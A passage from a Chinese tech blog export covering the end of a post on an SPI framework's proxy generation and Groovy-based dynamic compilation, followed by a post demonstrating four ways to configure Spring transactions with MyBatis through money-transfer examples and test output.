上面的逻辑可以分为两块，一块是上半边的初始化，获取spiImplClassCacheMap;下一块则是扫描实现类的所有方法，将方法上标有@SpiConf注解的捞出来，用于初始化 spiImplMethodCacheMap 说明 缓存结构中value为 SpiImplWrapper 缓存value并不是简单的实现类，封装类的定义如下，将条件和排序也同时封装进去了 1234567891011121314151617181920private T spiImpl;private int order;/*** spiImpl 的标识name, 要求唯一* &lt;p/&gt;* {@link com.hust.hui.quicksilver.spi.selector.DefaultSelector 选择具体的SpiImpl 时使用}*/private String name;/*** 参数校验规则* &lt;p/&gt;* {@link com.hust.hui.quicksilver.spi.selector.ParamsSelector} 选择具体的SpiImpl 时使用* 要求每个实现类都有注解 {@link SpiConf}*/private Map&lt;String, String&gt; paramCondition; name 的定义，类与方法两个纬度的缓存中，定义规则不同，具体可以看《缓存结构》这里的说明 采用 ParamsSelector 时， 要求 @SpiConf 注解必须存在 注意扫描所有方法对应的注解, spi实现类，如果存在继承则会出现问题 // todo 改成 getMethods(), 但是过滤掉 Object类中的基础方法 Method[] methods = t.getClass().getDeclaredMethods(); 动态代码生成 上面在谈论动态使用的时候，采用的方案是，生成一个代理类，实现spi接口， 在具体的实现逻辑中，使用选择器来获取满足条件的实现类，然后执行相应的方法 1. 代理类格式采用倒推方式，先给出一个实际的代理类如下，具体的实现中其实只有两行代码 获取具体的实现类 （调用上面的 SpiLoader.getService(conf, methodName） 执行实现类的接口 123456789101112131415161718192021222324package com.hust.hui.quicksilver.spi.test.print;import com.hust.hui.quicksilver.spi.SpiLoader;public class IPrint$Proxy implements com.hust.hui.quicksilver.spi.test.print.IPrint { public void print(java.lang.String arg0) { try { com.hust.hui.quicksilver.spi.test.print.IPrint spiImpl = SpiLoader.load(com.hust.hui.quicksilver.spi.test.print.IPrint.class).getService(arg0, \"print\"); spiImpl.print(arg0); } catch (com.hust.hui.quicksilver.spi.exception.NoSpiMatchException e) { throw new java.lang.RuntimeException(e); } } public void adaptivePrint(java.lang.String arg0, java.lang.String arg1) { try { com.hust.hui.quicksilver.spi.test.print.IPrint spiImpl = SpiLoader.load(com.hust.hui.quicksilver.spi.test.print.IPrint.class).getService(arg0, \"adaptivePrint\"); spiImpl.adaptivePrint(arg0, arg1); } catch (com.hust.hui.quicksilver.spi.exception.NoSpiMatchException e) { throw new java.lang.RuntimeException(e); } }} 上面给出了一个代理类的演示，那么剩下两个问题，一个是如何生成代理类； 一个是如何运行代理类（上面是java代码，我们知道运行得是字节码才行） 代理类生成对着上面的实现，反推代码生成，其实比较简单了，无非就是生成一大串的String罢了，这里真没什么特殊的，贴下实现，逻辑省略 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/** * 构建SPI接口的实现代理类, 在执行动态适配的方法时, 调用SpiLoader的 spiImpl选择器, 选择具体的实现类执行 * * @return */public static String buildTempImpl(Class type) { StringBuilder codeBuilder = new StringBuilder(); codeBuilder.append(\"package \").append(type.getPackage().getName()).append(\";\"); codeBuilder.append(\"\\nimport \").append(SpiLoader.class.getName()).append(\";\"); codeBuilder.append(\"\\npublic class \").append(type.getSimpleName()).append(\"$Proxy implements \").append(type.getCanonicalName()).append(\" {\\n\"); Method[] methods = type.getMethods(); for (Method method : methods) { Class&lt;?&gt; returnType = method.getReturnType(); //函数返回值 Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();//函数参数列表 Class&lt;?&gt;[] exceptionTypes = method.getExceptionTypes();//函数异常列表 // build method code StringBuilder code = new StringBuilder(512); if (parameterTypes.length &lt; 0) { //检查该函数参数列表中，第一个参数作为选择器参数 code.append(\"throw new IllegalArgumentException(\\\"there should be one argument for selector to choose spiImpl\\\")\"); } else { // 没有 SpiAdaptive注解的, 采用默认的注解方式 code.append(\"try{\\n\"); code.append(type.getName()).append(\" spiImpl=\") .append(\"SpiLoader.load(\") .append(type.getName()).append(\".class\") .append(\").getService(arg0,\\\"\") .append(method.getName()) .append(\"\\\");\"); if (!\"void\".equals(returnType.getName())) { code.append(\"return \"); } code.append(\"spiImpl.\").append(method.getName()).append(\"(arg0\"); for (int i = 1; i &lt; parameterTypes.length; i++) { code.append(\",\").append(\"arg\").append(i); } code.append(\");\"); code.append(\"\\n} catch(com.hust.hui.quicksilver.spi.exception.NoSpiMatchException e){\\nthrow new java.lang.RuntimeException(e);\\n}\"); } // build method signature codeBuilder.append(\"\\npublic \").append(returnType.getName()).append(\" \").append(method.getName()) .append(\"(\").append(parameterTypes[0].getName()).append(\" arg0\"); for (int i = 1; i &lt; parameterTypes.length; i++) { codeBuilder.append(\", \").append(parameterTypes[i].getName()).append(\" arg\").append(i); } codeBuilder.append(\") \"); if (exceptionTypes.length &gt; 0) { codeBuilder.append(\"throw \").append(exceptionTypes[0].getName()); for (int i = 1; i &lt; exceptionTypes.length; i++) { codeBuilder.append(\", \").append(exceptionTypes[i].getName()); } } codeBuilder.append(\"{\\n\"); codeBuilder.append(code.toString()).append(\"\\n}\"); } codeBuilder.append(\"\\n}\"); return codeBuilder.toString();} 动态编译运行动态编译，最开始想的是利用jdk的动态编译方式，试来试去没搞成功，然后选择了一个折中的方案，把代理类看成是groovy代码，利用 GroovyEngine 来实现动态运行, 这一块的逻辑也超级简单，下面的短短几行代码即可； 后面有空单独研究下java的动态编译 12345678910111213141516@SuppressWarnings(\"unchecked\")public static &lt;T&gt; T compile(String code, Class&lt;T&gt; interfaceType, ClassLoader classLoader) throws SpiProxyCompileException { GroovyClassLoader loader = new GroovyClassLoader(classLoader); Class clz = loader.parseClass(code); if (!interfaceType.isAssignableFrom(clz)) { throw new IllegalStateException(\"illegal proxy type!\"); } try { return (T) clz.newInstance(); } catch (Exception e) { throw new SpiProxyCompileException(\"init spiProxy error! msg: \" + e.getMessage()); }} 小结至此，核心的东西基本上都过了一遍，主要的设计思路，实现逻辑，执行流程都说完了 博客系列链接： SPI框架实现之旅四：使用测试 SPI框架实现之旅三：实现说明 SPI框架实现之旅二：整体设计 SPI框架实现之旅一：背景介绍 项目: QuickAlarm 项目地址： Quick-SPI 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2017/05/29/SPI框架实现之旅三：实现说明/"},{"title":"Spring学习之事务的使用姿势","text":"Spring + mybatis + mysql 使用事务的几种姿势主要记录下spring是如何支持事务的，以及在Spring结合mybatis时，可以怎么简单的实现数据库的事务功能 I. 前提case1：两张表的的事务支持情况首先准备两张表，一个user表，一个story表，结构如下 1234567891011121314151617181920212223CREATE TABLE `user` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(20) NOT NULL DEFAULT '' COMMENT '用户名', `pwd` varchar(26) NOT NULL DEFAULT '' COMMENT '密码', `isDeleted` tinyint(1) NOT NULL DEFAULT '0', `created` varchar(13) NOT NULL DEFAULT '0', `updated` varchar(13) NOT NULL DEFAULT '0', PRIMARY KEY (`id`), KEY `name` (`name`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `story` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `userId` int(20) unsigned NOT NULL DEFAULT '0' COMMENT '作者的userID', `name` varchar(20) NOT NULL DEFAULT '' COMMENT '作者名', `title` varchar(26) NOT NULL DEFAULT '' COMMENT '密码', `story` text COMMENT '故事内容', `isDeleted` tinyint(1) NOT NULL DEFAULT '0', `created` varchar(13) NOT NULL DEFAULT '0', `updated` varchar(13) NOT NULL DEFAULT '0', PRIMARY KEY (`id`), KEY `userId` (`userId`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; 我们的事务场景在于用户修改name时，要求两张表的name都需要一起修改，不允许出现不一致的情况 case2：单表的事务支持转账，一个用户减钱，另一个用户加钱 12345678910CREATE TABLE `money` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(20) NOT NULL DEFAULT '' COMMENT '用户名', `money` int(26) NOT NULL DEFAULT '0' COMMENT '钱', `isDeleted` tinyint(1) NOT NULL DEFAULT '0', `created` varchar(13) NOT NULL DEFAULT '0', `updated` varchar(13) NOT NULL DEFAULT '0', PRIMARY KEY (`id`), KEY `name` (`name`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; 相比上面那个case，这个更加简单了，下面的实例则主要根据这个进行说明，至于case1，则留待扩展里面进行 首先是实现对应的dao和entity 12345678910111213141516171819202122232425@Datapublic class MoneyEntity implements Serializable { private static final long serialVersionUID = -7074788842783160025L; private int id; private String name; private int money; private int isDeleted; private int created; private int updated;}public interface MoneyDao { MoneyEntity queryMoney(@Param(\"id\") int userId); // 加钱，负数时表示减钱 int incrementMoney(@Param(\"id\") int userId, @Param(\"addMoney\") int addMoney);} 对应的mapper文件为 12345678910111213141516171819202122232425&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt;&lt;mapper namespace=\"com.git.hui.demo.mybatis.mapper.MoneyDao\"&gt; &lt;sql id=\"moneyEntity\"&gt; id, `name`, `money`, `isDeleted`, `created`, `updated` &lt;/sql&gt; &lt;select id=\"queryMoney\" resultType=\"com.git.hui.demo.mybatis.entity.MoneyEntity\"&gt; select &lt;include refid=\"moneyEntity\"/&gt; from money where id=#{id} &lt;/select&gt; &lt;update id=\"incrementMoney\"&gt; update money set money=money + #{addMoney} where id=#{id} &lt;/update&gt;&lt;/mapper&gt; 对应的mybatis连接数据源的相关配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;bean class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"&gt; &lt;property name=\"locations\"&gt; &lt;value&gt;classpath*:jdbc.properties&lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&lt;bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\" init-method=\"init\" destroy-method=\"close\"&gt; &lt;property name=\"driverClassName\" value=\"${driver}\"/&gt; &lt;property name=\"url\" value=\"${url}\"/&gt; &lt;property name=\"username\" value=\"${username}\"/&gt; &lt;property name=\"password\" value=\"${password}\"/&gt; &lt;property name=\"filters\" value=\"stat\"/&gt; &lt;property name=\"maxActive\" value=\"20\"/&gt; &lt;property name=\"initialSize\" value=\"1\"/&gt; &lt;property name=\"maxWait\" value=\"60000\"/&gt; &lt;property name=\"minIdle\" value=\"1\"/&gt; &lt;property name=\"timeBetweenEvictionRunsMillis\" value=\"60000\"/&gt; &lt;property name=\"minEvictableIdleTimeMillis\" value=\"300000\"/&gt; &lt;property name=\"validationQuery\" value=\"SELECT 'x'\"/&gt; &lt;property name=\"testWhileIdle\" value=\"true\"/&gt; &lt;property name=\"testOnBorrow\" value=\"false\"/&gt; &lt;property name=\"testOnReturn\" value=\"false\"/&gt; &lt;property name=\"poolPreparedStatements\" value=\"true\"/&gt; &lt;property name=\"maxPoolPreparedStatementPerConnectionSize\" value=\"50\"/&gt;&lt;/bean&gt;&lt;bean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;!-- 指定mapper文件 --&gt; &lt;property name=\"mapperLocations\" value=\"classpath*:mapper/*.xml\"/&gt;&lt;/bean&gt;&lt;!-- 指定扫描dao --&gt;&lt;bean class=\"org.mybatis.spring.mapper.MapperScannerConfigurer\"&gt; &lt;property name=\"basePackage\" value=\"com.git.hui.demo.mybatis\"/&gt;&lt;/bean&gt; II. 实例演示通过网上查询，Spring事务管理总共有四种方式，下面逐一进行演示，每种方式是怎么玩的，然后看实际项目中应该如何抉择 1. 硬编码方式编程式事务管理，既通过TransactionTemplate来实现多个db操作的事务管理 a. 实现那么，我们的转账case可以如下实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172@Repositorypublic class CodeDemo1 { @Autowired private MoneyDao moneyDao; @Autowired private TransactionTemplate transactionTemplate; /** * 转账 * * @param inUserId * @param outUserId * @param payMoney * @param status 0 表示正常转账， 1 表示内部抛出一个异常， 2 表示新开一个线程，修改inUserId的钱 +200， 3 表示新开一个线程，修改outUserId的钱 + 200 */ public void transfor(final int inUserId, final int outUserId, final int payMoney, final int status) { transactionTemplate.execute(new TransactionCallbackWithoutResult() { protected void doInTransactionWithoutResult(TransactionStatus transactionStatus) { MoneyEntity entity = moneyDao.queryMoney(outUserId); if (entity.getMoney() &gt; payMoney) { // 可以转账 // 先减钱 moneyDao.incrementMoney(outUserId, -payMoney); testCase(inUserId, outUserId, status); // 再加钱 moneyDao.incrementMoney(inUserId, payMoney); System.out.println(\"转账完成! now: \" + System.currentTimeMillis()); } } }); } // 下面都是测试用例相关 private void testCase(final int inUserId, final int outUserId, final int status) { if (status == 1) { throw new IllegalArgumentException(\"转账异常!!!\"); } else if(status == 2) { addMoney(inUserId); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } else if (status == 3) { addMoney(outUserId); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } } public void addMoney(final int userId) { System.out.printf(\"内部加钱: \" + System.currentTimeMillis()); new Thread(new Runnable() { public void run() { moneyDao.incrementMoney(userId, 200); System.out.println(\" sub modify success! now: \" + System.currentTimeMillis()); } }).start(); }} 主要看上面的transfor方法，内部通过 transactionTemplate 来实现事务的封装，内部有三个db操作，一个查询，两个更新，具体分析后面说明 上面的代码比较简单了，唯一需要关注的就是transactionTemplate这个bean如何定义的，xml文件中与前面重复的就不贴了，直接贴上关键代码, 一个是根据DataSource创建的TransactionManager，一个则是根据TransactionManager创建的TransactionTemplate 12345678&lt;!--编程式事务--&gt;&lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt;&lt;/bean&gt;&lt;bean id=\"transactionTemplate\" class=\"org.springframework.transaction.support.TransactionTemplate\"&gt; &lt;property name=\"transactionManager\" ref=\"transactionManager\"/&gt;&lt;/bean&gt; b. 测试用例正常演示情况, 演示没有任何异常，不考虑并发的情况 123456789101112131415161718192021222324@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration({\"classpath*:spring/service.xml\", \"classpath*:test-datasource1.xml\"})public class CodeDemo1Test { @Autowired private CodeDemo1 codeDemo1; @Autowired private MoneyDao moneyDao; @Test public void testTransfor() { System.out.println(\"---------before----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); codeDemo1.transfor(1, 2, 10, 0); System.out.println(\"---------after----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); }} 输出如下，两个账号的钱都没有问题 1234567---------before----------id: 1 money = 10000id: 2 money = 50000转账完成! now: 1526130394266---------after----------id: 1 money = 10010id: 2 money = 49990 转账过程中出现异常，特别是转账方钱已扣，收款方还没收到钱时，也就是case中的status为1的场景 12345678910111213141516171819// 内部抛异常的情况@Testpublic void testTransforException() { System.out.println(\"---------before----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); try { codeDemo1.transfor(1, 2, 10, 1); } catch (Exception e) { e.printStackTrace(); } System.out.println(\"---------after----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney());} 对此，我们希望把转账方的钱还回去, 输出如下，发现两个的钱都没有变化 12345678---------before----------id: 1 money = 10010id: 2 money = 49990---------after----------id: 1 money = 10010java.lang.IllegalArgumentException: 转账异常!!! ... // 省略异常信息id: 2 money = 49990 当status为2，表示在转账人钱已扣，收款人钱没收到之间，又有人给收款人转了200，此时根据mysql的锁机制，另外人的转账应该是立马到的（因为收款人账号没有被锁住），且金额不应该有问题 输出结果如下： 1234567891011---------before----------id: 1 money = 10010id: 2 money = 49990## 右边是注释: 转账过程中，另外存钱立马到账，没有被锁住内部加钱: 1526130827480sub modify success! now: 1526130827500 ## 存钱结束转账完成! now: 1526130830488---------after----------id: 1 money = 10220id: 2 money = 49980 当status为3， 表示在转账人钱已扣，收款人钱没收到之间，又有人给转账人转了200，这时因为转账人的记录以及被加了写锁，因此只能等待转账的事务提交之后，才有可能+200成功，当然最终的金额也得一致 输出结果如下 1234567891011---------before----------id: 1 money = 10220id: 2 money = 49980## 右边是注释：内部存钱了，但没有马上成功## 直到转账完成后，才立马存成功，注意两个时间戳内部加钱: 1526131101046转账完成! now: 1526131104051sub modify success! now: 1526131104053---------after----------id: 1 money = 10230id: 2 money = 50170 c. 小结至此，编程式事务已经实例演示ok，从上面的过程，给人的感觉就和直接写事务相关的sql一样， 123456start transaction;-- 这中间就是 TransactionTemplate#execute 方法内部的逻辑-- 也就是需要事务管理的一组sqlcommit; 2. 基于TransactionProxyFactoryBean方式接下来的三个就是声明式事务管理，这种用得也比较少，因为需要每个事务管理类，添加一个TransactionProxyFactoryBean a. 实现除了将 TransactionTemplate 干掉，并将内部的sql逻辑移除之外，对比前面的，发现基本上没有太多差别 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465public class FactoryBeanDemo2 { @Autowired private MoneyDao moneyDao; /** * 转账 * * @param inUserId * @param outUserId * @param payMoney * @param status 0 表示正常转账， 1 表示内部抛出一个异常， 2 表示新开一个线程，修改inUserId的钱 +200， 3 表示新开一个线程，修改outUserId的钱 + 200 */ public void transfor(final int inUserId, final int outUserId, final int payMoney, final int status) { MoneyEntity entity = moneyDao.queryMoney(outUserId); if (entity.getMoney() &gt; payMoney) { // 可以转账 // 先减钱 moneyDao.incrementMoney(outUserId, -payMoney); testCase(inUserId, outUserId, status); // 再加钱 moneyDao.incrementMoney(inUserId, payMoney); System.out.println(\"转账完成! now: \" + System.currentTimeMillis()); } } private void testCase(final int inUserId, final int outUserId, final int status) { if (status == 1) { throw new IllegalArgumentException(\"转账异常!!!\"); } else if (status == 2) { addMoney(inUserId); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } else if (status == 3) { addMoney(outUserId); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } } public void addMoney(final int userId) { System.out.println(\"内部加钱: \" + System.currentTimeMillis()); new Thread(new Runnable() { public void run() { moneyDao.incrementMoney(userId, 200); System.out.println(\"sub modify success! now: \" + System.currentTimeMillis()); } }).start(); }} 重点来了，主要是需要配置一个 TransactionProxyBeanFactory，我们知道BeanFactory就是我们自己来创建Bean的一种手段，相关的xml配置如下 12345678910111213141516171819202122232425262728293031&lt;!--编程式事务--&gt;&lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt;&lt;/bean&gt;&lt;bean id=\"factoryBeanDemo2\" class=\"com.git.hui.demo.mybatis.repository.transaction.FactoryBeanDemo2\"/&gt;&lt;!-- 配置业务层的代理 --&gt;&lt;bean id=\"factoryBeanDemoProxy\" class=\"org.springframework.transaction.interceptor.TransactionProxyFactoryBean\"&gt; &lt;!-- 配置目标对象 --&gt; &lt;property name=\"target\" ref=\"factoryBeanDemo2\" /&gt; &lt;!-- 注入事务管理器 --&gt; &lt;property name=\"transactionManager\" ref=\"transactionManager\"/&gt; &lt;!-- 注入事务的属性 --&gt; &lt;property name=\"transactionAttributes\"&gt; &lt;props&gt; &lt;!-- prop的格式: * PROPAGATION :事务的传播行为 * ISOTATION :事务的隔离级别 * readOnly :只读 * -EXCEPTION :发生哪些异常回滚事务 * +EXCEPTION :发生哪些异常不回滚事务 --&gt; &lt;!-- 这个key对应的就是目标类中的方法--&gt; &lt;prop key=\"transfor\"&gt;PROPAGATION_REQUIRED&lt;/prop&gt; &lt;!-- &lt;prop key=\"transfer\"&gt;PROPAGATION_REQUIRED,readOnly&lt;/prop&gt; --&gt; &lt;!-- &lt;prop key=\"transfer\"&gt;PROPAGATION_REQUIRED,+java.lang.ArithmeticException&lt;/prop&gt; --&gt; &lt;/props&gt; &lt;/property&gt;&lt;/bean&gt; 通过上面的配置，大致可以了解到这个通过TransactionProxyFactoryBean就是创建了一个FactoryBeanDemo2的代理类，这个代理类内部封装好事务相关的逻辑，可以看做是前面编程式的一种简单通用抽象 b. 测试测试代码与前面基本相同，唯一的区别就是我们使用的应该是上面BeanFactory生成的Bean，而不是直接使用FactoryBeanDemo2 正常演示case: 1234567891011121314151617181920212223242526@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration({\"classpath*:spring/service.xml\", \"classpath*:test-datasource2.xml\"})public class FactoryBeanDemo1Test { @Resource(name = \"factoryBeanDemoProxy\") private FactoryBeanDemo2 factoryBeanDemo2; @Autowired private MoneyDao moneyDao; @Test public void testTransfor() { System.out.println(\"---------before----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); factoryBeanDemo2.transfor(1, 2, 10, 0); System.out.println(\"---------after----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); }} 输出 1234567---------before----------id: 1 money = 10000id: 2 money = 50000转账完成! now: 1526132058886---------after----------id: 1 money = 10010id: 2 money = 49990 status为1，内部异常的情况下，我们希望钱也不会有问题 123456789101112131415161718@Testpublic void testTransforException() { System.out.println(\"---------before----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); try { factoryBeanDemo2.transfor(1, 2, 10, 1); } catch (Exception e) { System.out.println(e.getMessage());; } System.out.println(\"---------after----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney());} 输出为 1234567---------before----------id: 1 money = 10010id: 2 money = 49990转账异常!!!---------after----------id: 1 money = 10010id: 2 money = 49990 status为2 时，分析结果与上面应该相同，输出如下 123456789---------before----------id: 1 money = 10010id: 2 money = 49950内部加钱: 1526133325376sub modify success! now: 1526133325387转账完成! now: 1526133328381---------after----------id: 1 money = 10220id: 2 money = 49940 status为3时，输出 123456789---------before----------id: 1 money = 10220id: 2 money = 49940内部加钱: 1526133373466转账完成! now: 1526133376476sub modify success! now: 1526133376480---------after----------id: 1 money = 10230id: 2 money = 50130 c. 小结TransactionProxyFactoryBean 的思路就是利用代理模式来实现事务管理，生成一个代理类，拦截目标方法，将一组sql的操作封装到事务中进行；相比较于硬编码，无侵入，而且支持灵活的配置方式 缺点也显而易见，每个都要进行配置，比较繁琐 3. xml使用方式Spring有两大特点，IoC和AOP，对于事务这种情况而言，我们可不可以使用AOP来做呢？ 对于需要开启事务的方法，拦截掉，执行前开始事务，执行完毕之后提交事务，出现异常时回滚 这样一看，感觉还是蛮有希望的，而下面两种姿势正是这么玩的，因此需要加上aspect的依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.8.7&lt;/version&gt;&lt;/dependency&gt; a. 实现java类与第二种完全一致，变动的只有xml 123456789101112131415161718192021222324252627282930313233&lt;!-- 首先添加命名空间 --&gt;xmlns:tx=\"http://www.springframework.org/schema/tx\" xmlns:aop=\"http://www.springframework.org/schema/aop\"xsi:schemaLocation=\"... http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\"&lt;!--对应的事务通知和切面配置--&gt;&lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;tx:attributes&gt; &lt;!-- propagation :事务传播行为 isolation :事务的隔离级别 read-only :只读 rollback-for:发生哪些异常回滚 no-rollback-for :发生哪些异常不回滚 timeout :过期信息 --&gt; &lt;tx:method name=\"transfor\" propagation=\"REQUIRED\"/&gt; &lt;/tx:attributes&gt;&lt;/tx:advice&gt;&lt;!-- 配置切面 --&gt;&lt;aop:config&gt; &lt;!-- 配置切入点 --&gt; &lt;aop:pointcut expression=\"execution(* com.git.hui.demo.mybatis.repository.transaction.XmlDemo3.*(..))\" id=\"pointcut1\"/&gt; &lt;!-- 配置切面 --&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut1\"/&gt;&lt;/aop:config&gt; 观察上面的配置，再想想第二种方式，思路都差不多了，但是这种方式明显更加通用，通过切面和切点，可以减少大量的配置 b. 测试12345678910111213141516171819202122232425@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration({\"classpath*:spring/service.xml\", \"classpath*:test-datasource3.xml\"})public class XmlBeanTest { @Autowired private XmlDemo3 xmlDemo; @Autowired private MoneyDao moneyDao; @Test public void testTransfor() { System.out.println(\"---------before----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); xmlDemo.transfor(1, 2, 10, 0); System.out.println(\"---------after----------\"); System.out.println(\"id: 1 money = \" + moneyDao.queryMoney(1).getMoney()); System.out.println(\"id: 2 money = \" + moneyDao.queryMoney(2).getMoney()); }} 这个测试起来，和一般的写法就没啥两样了，比第二种的FactoryBean的注入方式简单点 正常输出 1234567---------before----------id: 1 money = 10000id: 2 money = 50000转账完成! now: 1526135301273---------after----------id: 1 money = 10010id: 2 money = 49990 status=1 出现异常时，输出 1234567---------before----------id: 1 money = 10010id: 2 money = 49990转账异常!!!---------after----------id: 1 money = 10010id: 2 money = 49990 status=2 转账过程中，又存钱的场景，输出，与前面预期一致 123456789---------before----------id: 1 money = 10010id: 2 money = 49990内部加钱: 1526135438403sub modify success! now: 1526135438421转账完成! now: 1526135441410---------after----------id: 1 money = 10220id: 2 money = 49980 status=3 的输出，与前面预期一致 123456789---------before----------id: 1 money = 10220id: 2 money = 49980内部加钱: 1526135464341转账完成! now: 1526135467349sub modify success! now: 1526135467352---------after----------id: 1 money = 10230id: 2 money = 50170 4. 注解方式这个就是消灭xml，用注解来做的方式，就是将前面xml中的配置用 @Transactional注解替换 a. 实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374@Repositorypublic class AnnoDemo4 { @Autowired private MoneyDao moneyDao; /** * 转账 * * @param inUserId * @param outUserId * @param payMoney * @param status 0 表示正常转账， 1 表示内部抛出一个异常， 2 表示新开一个线程，修改inUserId的钱 +200， 3 表示新开一个线程，修改outUserId的钱 + 200 * * * Transactional注解中的的属性 propagation :事务的传播行为 isolation :事务的隔离级别 readOnly :只读 * rollbackFor :发生哪些异常回滚 noRollbackFor :发生哪些异常不回滚 * rollbackForClassName 根据异常类名回滚 */ @Transactional(propagation = Propagation.REQUIRED, isolation = Isolation.DEFAULT, readOnly = false) public void transfor(final int inUserId, final int outUserId, final int payMoney, final int status) { MoneyEntity entity = moneyDao.queryMoney(outUserId); if (entity.getMoney() &gt; payMoney) { // 可以转账 // 先减钱 moneyDao.incrementMoney(outUserId, -payMoney); testCase(inUserId, outUserId, status); // 再加钱 moneyDao.incrementMoney(inUserId, payMoney); System.out.println(\"转账完成! now: \" + System.currentTimeMillis()); } } private void testCase(final int inUserId, final int outUserId, final int status) { if (status == 1) { throw new IllegalArgumentException(\"转账异常!!!\"); } else if (status == 2) { addMoney(inUserId); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } else if (status == 3) { addMoney(outUserId); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } } private void addMoney(final int userId) { System.out.println(\"内部加钱: \" + System.currentTimeMillis()); new Thread(new Runnable() { public void run() { moneyDao.incrementMoney(userId, 200); System.out.println(\"sub modify success! now: \" + System.currentTimeMillis()); } }).start(); }} 因此需要在xml中配置，开启事务注解 12345678&lt;!--编程式事务--&gt;&lt;bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\"&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt;&lt;/bean&gt;&lt;tx:annotation-driven transaction-manager=\"transactionManager\"/&gt; 这样一看，就更加清晰了，实际项目中，xml和注解方式也是用得最多的场景了 b. 测试case和第三种测试case完全相同, 输出结果也一样，直接省略 III. 小结上面说了Spring中四种使用事务的姿势，其中硬编码方式可能是最好理解的，就相当于将我们写sql中，使用事务的方式直接翻译成对应的java代码了；而FactoryBean方式相当于特殊情况特殊对待，为每个事务来一个代理类来增强事务功能；后面的两个则原理差不多都是利用事务通知（AOP)来实现，定义切点及相关信息 编程式： 注入 TransactionTemplate 将利用事务的逻辑封装到 transactionTemplate#execute方法内 代理BeanFactory： 利用 TransactionProxyFactoryBean 为事务相关类生成代理 使用方通过FactoryBean获取代理类，作为使用的Bean xml配置： 利用 tx标签 + aop方式来实现 &lt;tx:advice&gt; 标签定义事务通知，内部可有较多的配置信息 &lt;aop:config&gt; 配置切点，切面 注解方式： 在开启事务的方法or类上添加 @Transactional 注解即可 开启事务注解 &lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot;/&gt; IV. 其他1. 参考文档 Spring事务管理的四种方式 源码 项目源码：study-demo 主要查看包路径： 事务demo 测试相关代码： 测试demo 2. 个人博客： 一灰灰Blog基于hexo + github 